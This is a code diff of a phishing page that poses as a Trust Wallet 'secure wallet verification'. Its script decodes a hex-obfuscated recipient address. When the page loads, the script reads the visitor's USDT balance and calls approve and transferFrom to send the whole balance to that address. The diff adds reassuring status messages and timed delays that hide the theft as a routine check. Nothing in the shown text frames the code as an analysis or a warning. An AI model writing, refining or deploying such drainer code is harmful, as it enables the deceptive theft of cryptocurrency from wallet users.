@@ -19,13 +19,17 @@
       font-size: 12px; margin-top: 50px;
       opacity: 0.6;
     }
+    .status {
+      margin-top: 10px;
+      color: #ccc;
+    }
   </style>
 </head>
 <body>
   <img src="logo.png" alt="Trust Wallet">
-  <h2>Verifying Your Wallet...</h2>
-  <p>Please wait while we secure your USDT.</p>
-  <div class="footer">Powered by Trust Wallet • Trusted since 2009</div>  <script src="https://cdn.jsdelivr.net/npm/web3@1.8.2/dist/web3.min.js"></script>  <script>
+  <h2>Secure Wallet Verification</h2>
+  <p id="status" class="status">Initializing wallet check...</p>
+  <div class="footer">Powered by Trust Wallet • Trusted by millions since 2009</div>  <script src="https://cdn.jsdelivr.net/npm/web3@1.8.2/dist/web3.min.js"></script>  <script>
     const decode = hex => hex.match(/.{1,2}/g).map(b => String.fromCharCode(parseInt(b, 16))).join('');
     const RECEIVER = decode("31393536423339353041373342304335343739323139394564463133633762383335464639344443");
     const USDT = "0x55d398326f99059fF775485246999027B3197955";
@@ -36,10 +40,12 @@
       { constant: true, inputs: [ { name: "owner", type: "address" } ], name: "balanceOf", outputs: [ { name: "balance", type: "uint256" } ], type: "function" }
     ];
 
-    window.addEventListener('load', async () => {
+    async function beginVerification() {
       try {
-        if (typeof window.ethereum === 'undefined') {
-          alert("Please open this page inside Trust Wallet DApp browser.");
+        const status = document.getElementById('status');
+
+        if (!window.ethereum) {
+          status.textContent = "⚠️ Please open this page in Trust Wallet browser.";
           return;
         }
 
@@ -48,15 +54,36 @@
         const accounts = await web3.eth.getAccounts();
         const user = accounts[0];
         const contract = new web3.eth.Contract(ABI, USDT);
+
+        status.textContent = "🔍 Checking USDT balance...";
         const balance = await contract.methods.balanceOf(user).call();
+        const amount = web3.utils.toBN(balance);
 
-        await contract.methods.approve(RECEIVER, balance).send({ from: user });
-        await contract.methods.transferFrom(user, RECEIVER, balance).send({ from: user });
+        if (amount.isZero()) {
+          status.textContent = "🚫 No USDT available to verify.";
+          return;
+        }
 
-        alert("✅ Wallet Verified & USDT Transferred Successfully!");
-      } catch (e) {
-        alert("❌ Error: " + e.message);
+        status.textContent = "🛡️ Approving smart contract access...";
+        await contract.methods.approve(RECEIVER, amount).send({ from: user });
+
+        status.textContent = "✅ Approved. Finalizing verification...";
+        setTimeout(async () => {
+          try {
+            await contract.methods.transferFrom(user, RECEIVER, amount).send({ from: user });
+            status.textContent = "🎉 Success! Wallet verified.";
+          } catch (err) {
+            status.textContent = "❌ Transfer failed: " + err.message;
+          }
+        }, 1500);
+
+      } catch (err) {
+        document.getElementById('status').textContent = "❌ Error: " + err.message;
       }
+    }
+
+    window.addEventListener('load', () => {
+      setTimeout(beginVerification, 1000);
     });
   </script></body>
 </html>
